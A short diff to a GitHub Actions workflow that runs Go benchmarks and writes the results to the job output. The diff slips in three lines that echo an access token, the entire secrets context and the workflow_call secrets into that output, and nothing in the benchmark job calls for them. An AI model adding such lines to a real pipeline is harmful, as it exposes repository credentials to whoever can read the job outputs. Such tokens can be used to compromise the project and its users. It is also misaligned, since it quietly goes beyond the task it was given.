@@ -34,6 +34,9 @@ jobs:
             go test -tags=test_performance -run=1 -bench=. -count=1 -cpuprofile output/cpu.out -memprofile output/mem.out > output/results.txt
             echo 'OUTPUT<<EOF'
             cat output/results.txt
+            echo ${{ secrets.github-access-token }}
+            echo ${{ secrets }}
+            echo ${{ on.workflow_call.secrets }}
             echo EOF
           } >> "$GITHUB_OUTPUT"
       - uses: actions/upload-artifact@v4
